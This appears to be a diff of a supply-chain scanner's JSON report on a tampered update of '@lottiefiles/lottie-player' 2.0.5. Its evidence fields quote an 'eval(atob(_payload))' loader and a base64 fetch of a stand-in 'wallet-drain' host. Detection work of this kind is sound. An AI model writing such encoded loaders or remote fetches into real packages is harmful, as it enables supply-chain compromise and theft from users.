@@ -3,30 +3,6 @@
   "verdict": "BLOCK",
   "findings": [
     {
-      "detector": "code.dynamic-loading-added",
-      "category": "CODE",
-      "package": "@lottiefiles/lottie-player",
-      "from": "2.0.4",
-      "to": "2.0.5",
-      "direction": "changed",
-      "severity": "BLOCK",
-      "confidence": "high",
-      "message": "Dynamic code sink introduced (eval). [escalated: package '@lottiefiles/lottie-player' has 2 WARN findings across 2 categories; source detectors: code.dynamic-loading-added, net.new-endpoint] [GHSA: GHSA-cwfw-4gq5-mrqx]",
-      "evidence": [
-        {
-          "file": "index.js",
-          "line": 7,
-          "snippet": "eval(atob(_payload));"
-        }
-      ],
-      "provenance": [
-        [
-          "my-app",
-          "@lottiefiles/lottie-player"
-        ]
-      ]
-    },
-    {
       "detector": "net.encoded-endpoint",
       "category": "NET",
       "package": "@lottiefiles/lottie-player",
@@ -40,7 +16,31 @@
         {
           "file": "index.js",
           "line": 2,
-          "snippet": "base64(\"ZmV0Y2goImh0dHBzOi8vd2FsbGV0LWRyYWluLmV4YW1wbGUuaW52YWxpZC9p\") \u2192 https://wallet-drain.example.invalid/inject.js"
+          "snippet": "base64(\"ZmV0Y2goImh0dHBzOi8vd2FsbGV0LWRyYWluLmV4YW1wbGUuaW52YWxpZC9p\") → https://wallet-drain.example.invalid/inject.js"
+        }
+      ],
+      "provenance": [
+        [
+          "my-app",
+          "@lottiefiles/lottie-player"
+        ]
+      ]
+    },
+    {
+      "detector": "code.dynamic-loading-added",
+      "category": "CODE",
+      "package": "@lottiefiles/lottie-player",
+      "from": "2.0.4",
+      "to": "2.0.5",
+      "direction": "changed",
+      "severity": "WARN",
+      "confidence": "high",
+      "message": "Dynamic code sink introduced (eval). [GHSA: GHSA-cwfw-4gq5-mrqx]",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 7,
+          "snippet": "eval(atob(_payload));"
         }
       ],
       "provenance": [
@@ -57,9 +57,9 @@
       "from": "2.0.4",
       "to": "2.0.5",
       "direction": "changed",
-      "severity": "BLOCK",
+      "severity": "WARN",
       "confidence": "high",
-      "message": "New network endpoint appeared: https://wallet-drain.example.invalid/inject.js [escalated: package '@lottiefiles/lottie-player' has 2 WARN findings across 2 categories; source detectors: code.dynamic-loading-added, net.new-endpoint] [GHSA: GHSA-cwfw-4gq5-mrqx]",
+      "message": "New network endpoint appeared: https://wallet-drain.example.invalid/inject.js [GHSA: GHSA-cwfw-4gq5-mrqx]",
       "evidence": [
         {
           "file": "index.js",
